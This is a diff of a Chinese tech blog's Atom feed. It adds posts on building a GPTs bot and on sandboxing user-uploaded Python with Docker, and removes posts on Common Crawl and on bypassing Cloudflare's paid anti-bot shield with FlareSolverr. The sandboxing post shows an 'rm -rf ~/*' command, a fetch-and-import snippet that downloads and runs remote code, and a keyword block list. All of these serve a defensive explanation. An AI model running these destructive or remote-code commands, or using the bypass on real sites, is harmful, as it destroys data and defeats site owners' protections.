@@ -6,7 +6,7 @@
   <link href="https://www.kingname.info/atom.xml" rel="self"/>
   
   <link href="https://www.kingname.info/"/>
-  <updated>2023-10-28T04:10:47.627Z</updated>
+  <updated>2023-11-11T07:00:05.749Z</updated>
   <id>https://www.kingname.info/</id>
   
   <author>
@@ -15,6 +15,53 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>老板让我加班怎么办？GPTs创建机器人实战</title>
+    <link href="https://www.kingname.info/2023/11/11/gpts/"/>
+    <id>https://www.kingname.info/2023/11/11/gpts/</id>
+    <published>2023-11-11T06:57:43.000Z</published>
+    <updated>2023-11-11T07:00:05.749Z</updated>
+    
+    <content type="html"><![CDATA[<p>前两天的OpenAI发布会，相信很多同学看完以后都热血沸腾。我之前一直使用的是ChatGPT的免费版本，看完这个发布会以后，立刻就充值了ChatGPT Plus，来试一试这些高级功能。</p><p>这两天GPTs功能上线了，短短三天时间，全球网友创建了几千个GPT机器人。我今天也来搞一个玩玩。</p><p>使用GPTs创建机器人非常简单，不需要懂任何编程知识，甚至不需要懂Prompt工程，你只需要跟着他的向导，一步一步描述你的想法就可以了。</p><span id="more"></span><p>当我们成为了ChatGPT Plus会员以后，在ChatGPT页面会看到一个<code>Explore</code>的栏目，如下图所示。进入这个栏目，点击<code>Create a GPT</code>就可以开始创建自己的机器人了。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140708.png"></p><p>在左侧，是机器人创建向导，它会首先让你描述一下，你想实现什么功能。这个地方不需要懂Prompt工程，你只需要像平时说话一样写出自己的需求就可以了。写中文或者英文都可以。如下图所示。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111142319.png"></p><p>描述完成需求以后，他会给你建议一个机器人的名字，你要是觉得他取的名字不好，你也可以自己想一个，直接输入到对话框中。</p><p>设置完成名字以后，他会自动给机器人生成头像。头像生成完成以后，会针对需求的一些细节问题跟你进一步确认，例如“当老板的需求明显不合理时，你应该直白拒绝还是委婉提出”。</p><p>你只需要一步一步跟着他的问题进行回复就可以了。我这个机器人创建完成，全程耗时大概10分钟左右。</p><p>创建完成以后，点击右上角的“Save”就可以保存。然后跳转回聊天页面，如下图所示。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111135632.png"></p><p>如果测试发现回答不好，可以在Explore页面编辑这个机器人，添加新的需求，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140147.png"></p><p>下面是我的一些聊天记录，大家可以看看效果。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140305.png"></p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140412.png"></p><p>在机器人的设置页面，进入<code>Configure</code>选项卡，可以看到机器人的配置信息，其中的Instructions，我理解才是真正的<code>Prompt</code>。它的内容，是GPT通过刚才跟你的一问一答，动态生成出来的。如果你会Prompt工程，你也可以直接在这里修改，速度更快。<br><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140513.png"></p><p><a href="https://chat.openai.com/g/g-Ru4uLNeoZ-ju-jue-gao-shou">Site Unreachable</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;前两天的OpenAI发布会，相信很多同学看完以后都热血沸腾。我之前一直使用的是ChatGPT的免费版本，看完这个发布会以后，立刻就充值了ChatGPT Plus，来试一试这些高级功能。&lt;/p&gt;
+&lt;p&gt;这两天GPTs功能上线了，短短三天时间，全球网友创建了几千个GPT机器人。我今天也来搞一个玩玩。&lt;/p&gt;
+&lt;p&gt;使用GPTs创建机器人非常简单，不需要懂任何编程知识，甚至不需要懂Prompt工程，你只需要跟着他的向导，一步一步描述你的想法就可以了。&lt;/p&gt;</summary>
+    
+    
+    
+    
+    <category term="ChatGPT" scheme="https://www.kingname.info/tags/ChatGPT/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一日一技：如何安全运行别人上传的Python代码？</title>
+    <link href="https://www.kingname.info/2023/11/11/python-run-other-code/"/>
+    <id>https://www.kingname.info/2023/11/11/python-run-other-code/</id>
+    <published>2023-11-11T06:55:59.000Z</published>
+    <updated>2023-11-11T06:57:33.789Z</updated>
+    
+    <content type="html"><![CDATA[<p>写后端的同学，有时候需要在网站上实现一个功能，让用户上传或者编写自己的Python代码。后端再运行这些代码。</p><p>涉及到用户自己上传代码，我们第一个想到的问题，就是如何避免用户编写危险命令。如果用户的代码里面涉及到下面两行，在不做任何安全过滤的情况下，就会导致服务器的Home文件夹被清空。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;rm -rf ~/*&#x27;)</span><br></pre></td></tr></table></figure><p>有人想的比较简单，直接判断用户的代码里面有没有<code>os.system</code>、<code>exec</code>、<code>subprocess</code>……这些危险关键词不就可以了吗？</p><p>这种想法乍看起来没有问题，但细想下，就会发现非常天真。如果用户的代码像下面这样写，你又要如何应对？</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">code = requests.get(<span class="string">&#x27;https://www.kingname.info/dangerous_code&#x27;</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dangerous_code.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code)</span><br><span class="line"></span><br><span class="line">dangerous_module = <span class="built_in">__import__</span>(<span class="string">&#x27;dangerous_code&#x27;</span>)</span><br><span class="line">danderous_module.delete_all()</span><br></pre></td></tr></table></figure><p>其中<code>https://www.kingname.info/dangerous_code</code>对应的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_all</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;rm -rf ~/*&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样就可以绕过关键字检查，并成功删除你的文件了。</p><p>如果你的网站本身就是一个爬虫管理平台，你检查用户自定义的代码时，肯定不能过滤掉<code>requests</code>这种网络请求库。那么你就很难判断用户下载下来的东西是否包含恶意代码。</p><p>而且恶意代码不一定是删除你的东西，它完全可以直接把你项目下面的所有代码打包，上传到它指定的URL中，这样就能窃取你网站里面所有代码。</p><p>为了避免这样的情况发生，我们就必须找一个干净又独立的环境来运行用户的代码。干净的环境能确保恶意代码没有东西可以偷，独立的环境能确保他即使删除了所有文件，也不会影响到你。</p><p>显然，最简单直接的办法，就是使用Docker来运行用户的代码。而使用Docker并不一定需要在终端使用Shell命令。我们可以使用Docker的Python SDK来实现构建镜像和运行镜像。</p><p>首先，确保你的服务器上面已经有Docker，并且正在运行。接下来，安装Docker SDK：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker</span><br></pre></td></tr></table></figure><p>假设，你把用户上传的文件放在了<code>user/&lt;user_id&gt;/upload</code>文件夹下面，那么，首先你需要生成一个Dockerfile，并把这个Dockerfile放到upload文件夹中：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> python:<span class="number">3.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">run</span><span class="language-bash"> pip install -r requirements.txt</span></span><br><span class="line"><span class="keyword">copy</span><span class="language-bash"> . /app</span></span><br><span class="line"><span class="keyword">workdir</span><span class="language-bash"> /app</span></span><br></pre></td></tr></table></figure><p>当用户添加&#x2F;修改了第三方库时，你只需要更新requirements.txt即可让镜像里面的依赖符合用户的需求。</p><p>接下来，我们开始构建镜像并运行代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line">client = docker.from_env()</span><br><span class="line"></span><br><span class="line">client.images.build(path=<span class="string">&#x27;user/&lt;user_id&gt;/upload&#x27;</span>, tag=<span class="string">&#x27;xxxspider:0.01&#x27;</span>) <span class="comment"># tag后面的名字可以自定义</span></span><br><span class="line"></span><br><span class="line">container = client.containers.run(<span class="string">&#x27;xxxspider:0.01&#x27;</span>, detach=<span class="literal">True</span>, command=<span class="string">&#x27;scrapy crawl xxx&#x27;</span>, 其他参数)</span><br></pre></td></tr></table></figure><p>这个代码运行以后是非阻塞的，会立刻返回container对象。当你想查看代码日志时，执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">container.logs(tail=<span class="number">10</span>) <span class="comment"># 显示最后10行日志</span></span><br></pre></td></tr></table></figure><p>就可以看到相关的日志了。</p><p>关于Docker SDK的更多操作，可以看他的官方文档：<a href="https://docker-py.readthedocs.io/en/stable/index.html#docker-sdk-for-python">Docker SDK for Python — Docker SDK for Python 6.1.3 documentation</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;写后端的同学，有时候需要在网站上实现一个功能，让用户上传或者编写自己的Python代码。后端再运行这些代码。&lt;/p&gt;
+&lt;p&gt;涉及到用户自己上传代码，我们第一个想到的问题，就是如何避免用户编写危险命令。如果用户的代码里面涉及到下面两行，在不做任何安全过滤的情况下，就会导致服务器的Home文件夹被清空。&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;os.system(&amp;#x27;rm -rf ~/*&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;有人想的比较简单，直接判断用户的代码里面有没有&lt;code&gt;os.system&lt;/code&gt;、&lt;code&gt;exec&lt;/code&gt;、&lt;code&gt;subprocess&lt;/code&gt;……这些危险关键词不就可以了吗？&lt;/p&gt;
+&lt;p&gt;这种想法乍看起来没有问题，但细想下，就会发现非常天真。如果用户的代码像下面这样写，你又要如何应对？&lt;/p&gt;</summary>
+    
+    
+    
+    
+    <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
+    
+    <category term="Docker" scheme="https://www.kingname.info/tags/Docker/"/>
+    
+  </entry>
   
   <entry>
     <title>一日一技：爬虫如何解析JavaScript Object？</title>
@@ -438,54 +485,6 @@
     <category term="语音转文字" scheme="https://www.kingname.info/tags/%E8%AF%AD%E9%9F%B3%E8%BD%AC%E6%96%87%E5%AD%97/"/>
     
     <category term="OpenAI" scheme="https://www.kingname.info/tags/OpenAI/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>助力大语言模型训练，无压力爬取六百亿网页</title>
-    <link href="https://www.kingname.info/2023/04/05/common-crawl/"/>
-    <id>https://www.kingname.info/2023/04/05/common-crawl/</id>
-    <published>2023-04-05T06:56:50.000Z</published>
-    <updated>2023-04-05T06:57:57.366Z</updated>
-    
-    <content type="html"><![CDATA[<p>ChatGPT一炮而红，让国内很多公司开始做大语言模型。然后他们很快就遇到了第一个问题，训练数据怎么来。有些公司去买数据，有些公司招聘爬虫工程师。但如果现在才开发爬虫，那恐怕已经来不及了。</p><p>即使爬虫工程师非常厉害，可以破解任意反爬虫机制，可以让爬虫跑满网络带宽，可是要训练出GPT-3这种规模的大语言模型，这个数据并不是一天两天就能爬完的。并且，有很多老网站的数据，早就被删除了，爬虫想爬也爬不到。</p><p>如果你看了今天这篇文章，那么恭喜你，你即将知道如何快速获取600亿网站的数据。从2008年开始爬取，这些网站数据横跨40多种语言。截止我写这篇文章的时候，最新的数据积累到了2023年2月。只要是Google现在或者曾经搜索得到的网站，你在这里都能找到。唯一制约你的，就是你的硬盘大小——仅仅2023年1月和2月的网页加到一起，就有400TB。而且所有这些数据，完全免费！不需要注册登录！不需要梯子！不需要下载任何额外软件！只需要浏览器或者Linux中的wget命令就能直接下载。</p><span id="more"></span><p>这个项目叫做<a href="https://commoncrawl.org/">Common Crawl</a>，官网长这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405134726.png"></p><p>获取数据的方法，网站已经写到了<a href="https://commoncrawl.org/the-data/get-started/">Get Started</a>中。我们来看看这个页面的第一段话：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405134908.png"></p><blockquote><p>The Common Crawl corpus contains petabytes of data collected since 2008. It contains raw web page data, extracted metadata and text extractions.</p><p>Common Crawl语料库包含了上PB的数据。这些数据从2008年开始收集。他包含了网页的原始页面HTML、提取出来的元信息和纯文本。</p></blockquote><p>Common Crawl的数据保存在亚马逊S3上面，我们可以直接通过HTTP来下载。当然如果你硬盘够大，你可以写代码来批量下载全部数据，这个时候可以使用Python的boto3模块访问S3.</p><p>我用HTTP下载的方式，来给大家演示一下这个数据怎么下载和使用。我们在上面提到的Get Started页面，找到你想下载数据的时间点。例如我想下载2023年1月和2月的网站数据，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405135318.png"></p><p>点击红框中的链接，进入一个新的页面。如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405135438.png"></p><p>从这个页面上，我们可以看到这个数据集的简介。2023年1月到2月的数据，从1月26号开始抓取，到2月9号截止。包含315亿个页面。原始数据不压缩的情况下有400TB。这些网站来自3300万个域名，130亿个之前没有抓过的URL。</p><p>在这个页面，我们可以看到一个表格，这里面显示了不同的数据类型：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405135838.png"></p><p>其中<code>WARC files</code>文件，记录的是网页的原始HTML代码。<code>WET files</code>文件，记录的是简单处理后，提取出来的网页所有纯文本。</p><p>大家不要被最后一列的数据大小吓到了。你不需要一次性下载这么大的数据。</p><p>以WARC文件为例，点击<code>File List</code>中的链接，会自动下载一个很小的压缩文件<code>warc.paths.gz</code>。这个文件需要使用gunzip命令来解压缩。这个命令理论上在macOS和Linux中都是自带的。使用如下命令解压缩：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip warc.paths.gz</span><br></pre></td></tr></table></figure><p>解压完成以后，会生成一个<code>warc.paths</code>的文件。这个文件有9.2MB，也非常的小。我们可以使用vim或者less命令查看里面的内容，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405140447.png"></p><p>这里面列出来的是不同时间段的文件。我们可以依次下载每个文件，分别解压缩。这样分文件，是Common Crawl为了方便大家下载而做的。否则一次性下载几十TB，谁受得了。</p><p>我们随便找一个地址，例如<code>crawl-data/CC-MAIN-2023-06/segments/1674764494826.88/warc/CC-MAIN-20230126210844-20230127000844-00001.warc.gz</code>。把这个地址前面拼接上域名<code>https://data.commoncrawl.org/</code>，因此完整的URL应该是：<code>https://data.commoncrawl.org/crawl-data/CC-MAIN-2023-06/segments/1674764494826.88/warc/CC-MAIN-20230126210844-20230127000844-00001.warc.gz</code>。这就是能够下载这个时间段数据的URL了。这个压缩文件有好几个G，因此不建议直接在浏览器上面打开这个URL。我们可以使用wget命令来下载。当然你也可以用迅雷来下。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405140939.png"></p><p>下载完成以后，会得到一个<code>CC-MAIN-20230126210844-20230127000844-00001.warc.gz</code>文件，继续使用<code>gunzip</code>命令解压缩，得到<code>CC-MAIN-20230126210844-20230127000844-00001.warc</code>文件。这个文件本质上是一个文本文件，可以使用vim或者less命令查看：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405141309.png"></p><p>这里面记录的是网站的元信息和HTML。数据是以WARC格式储存的。关于这个格式，在上面提到的Get Started页面可以看到具体的说明：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405141817.png"></p><p>你可以直接写一个程序来解析，或者安装一些现成的程序来解析，并转成JSON或者其他格式。Ubuntu下面可以使用apt命令安装warcat来解析，这里就不多说了。如果不知道怎么解析也可以问一问ChatGPT。</p><p>我们再来看一下<code>WET</code>文件，打开以后如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405142104.png"></p><p>算是一个比较粗糙的正文提取方法，仅仅是把页面上的所有文本全部提取出来了而已。</p><p>如果你想让新闻类、博客类文章的提取效果更好，那么可以试一试把这个WARC格式里面的HTML提取出来，然后使用我的<a href="https://github.com/GeneralNewsExtractor/GeneralNewsExtractor">GNE</a>来提取正文，提取效果就会好非常多：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230405142554.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>众所周知，中文互联网是封闭的互联网。但不要因此就觉得整个互联网上现在已经没有良心网站了。Common Crawl就属于这样的良心网站，完全免费，不需要注册登录，没有任何限制，不需要安装任何软件，直接获取15年来绝大部分网站的原始数据。</p><p>希望这些数据，能让我们自己的大模型更进一步。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;ChatGPT一炮而红，让国内很多公司开始做大语言模型。然后他们很快就遇到了第一个问题，训练数据怎么来。有些公司去买数据，有些公司招聘爬虫工程师。但如果现在才开发爬虫，那恐怕已经来不及了。&lt;/p&gt;
-&lt;p&gt;即使爬虫工程师非常厉害，可以破解任意反爬虫机制，可以让爬虫跑满网络带宽，可是要训练出GPT-3这种规模的大语言模型，这个数据并不是一天两天就能爬完的。并且，有很多老网站的数据，早就被删除了，爬虫想爬也爬不到。&lt;/p&gt;
-&lt;p&gt;如果你看了今天这篇文章，那么恭喜你，你即将知道如何快速获取600亿网站的数据。从2008年开始爬取，这些网站数据横跨40多种语言。截止我写这篇文章的时候，最新的数据积累到了2023年2月。只要是Google现在或者曾经搜索得到的网站，你在这里都能找到。唯一制约你的，就是你的硬盘大小——仅仅2023年1月和2月的网页加到一起，就有400TB。而且所有这些数据，完全免费！不需要注册登录！不需要梯子！不需要下载任何额外软件！只需要浏览器或者Linux中的wget命令就能直接下载。&lt;/p&gt;</summary>
-    
-    
-    
-    
-    <category term="通用爬虫" scheme="https://www.kingname.info/tags/%E9%80%9A%E7%94%A8%E7%88%AC%E8%99%AB/"/>
-    
-    <category term="ChatGPT" scheme="https://www.kingname.info/tags/ChatGPT/"/>
-    
-    <category term="大预言模型" scheme="https://www.kingname.info/tags/%E5%A4%A7%E9%A2%84%E8%A8%80%E6%A8%A1%E5%9E%8B/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一日一技：【最新】再次突破CloudFlare五秒盾付费版</title>
-    <link href="https://www.kingname.info/2023/02/25/crack-cf-2/"/>
-    <id>https://www.kingname.info/2023/02/25/crack-cf-2/</id>
-    <published>2023-02-25T03:01:20.000Z</published>
-    <updated>2023-02-25T03:02:37.234Z</updated>
-    
-    <content type="html"><![CDATA[<p>去年我写了一篇文章：<a href="https://mp.weixin.qq.com/s/zwmatF3yTgSyS0gz8sinaA">一日一技：如何捅穿Cloud Flare的5秒盾</a> ，这篇文章使用的第三方库『cloudscraper』可以绕过免费版的五秒盾。但遇到付费版就无能为力了。</p><span id="more"></span><p>最近在爬币圈的网站，其中有一个网站叫做：<a href="https://www.coinbase.com/ventures/content">Codebase</a>使用的就是付费版的CloudFlare五秒盾。当我们使用CloudScraper去爬时，报错如下：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230225100842.png"></p><p>那么现阶段，付费版的CloudFlare五秒盾，有没有什么办法绕过呢？其实方法非常简单。只需要使用Docker运行一个容器就可以了。启动命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name=flaresolverr \</span><br><span class="line">  -p 8191:8191 \</span><br><span class="line">  -e LOG_LEVEL=info \</span><br><span class="line">  --restart unless-stopped \</span><br><span class="line">  ghcr.io/flaresolverr/flaresolverr:latest</span><br></pre></td></tr></table></figure><p>这个容器启动以后，会开启8191端口。我们通过往这个端口发送http请求，让他转发请求给目标网站，就可以绕过五秒盾。</p><p>具体使用示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8191/v1&quot;</span></span><br><span class="line"></span><br><span class="line">payload = json.dumps(&#123;</span><br><span class="line">  <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;request.get&quot;</span>,</span><br><span class="line">  <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.coinbase.com/ventures/content&quot;</span>,</span><br><span class="line">  <span class="string">&quot;maxTimeout&quot;</span>: <span class="number">60000</span></span><br><span class="line">&#125;)</span><br><span class="line">headers = &#123;</span><br><span class="line">  <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个Docker镜像启动的接口，返回的数据是JOSN，网页源代码在其中的.solution.response中</span></span><br><span class="line"><span class="built_in">print</span>(response.json()[<span class="string">&#x27;solution&#x27;</span>][<span class="string">&#x27;response&#x27;</span>])</span><br></pre></td></tr></table></figure><p>访问效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230225101520.png"></p><p>我们再写几行代码来提取一下标题：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20230225104136.png"></p><p>我们启动的这个容器，为什么可以绕过CloudFlare的五秒盾呢，关键原因就在这个项目中：<a href="https://github.com/FlareSolverr/FlareSolverr">FlareSolverr</a>。大家可以阅读他的源代码，看看他是怎么绕过的。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;去年我写了一篇文章：&lt;a href=&quot;https://mp.weixin.qq.com/s/zwmatF3yTgSyS0gz8sinaA&quot;&gt;一日一技：如何捅穿Cloud Flare的5秒盾&lt;/a&gt; ，这篇文章使用的第三方库『cloudscraper』可以绕过免费版的五秒盾。但遇到付费版就无能为力了。&lt;/p&gt;</summary>
-    
-    
-    
-    
-    <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
-    
-    <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
-    
-    <category term="5秒盾" scheme="https://www.kingname.info/tags/5%E7%A7%92%E7%9B%BE/"/>
     
   </entry>
   
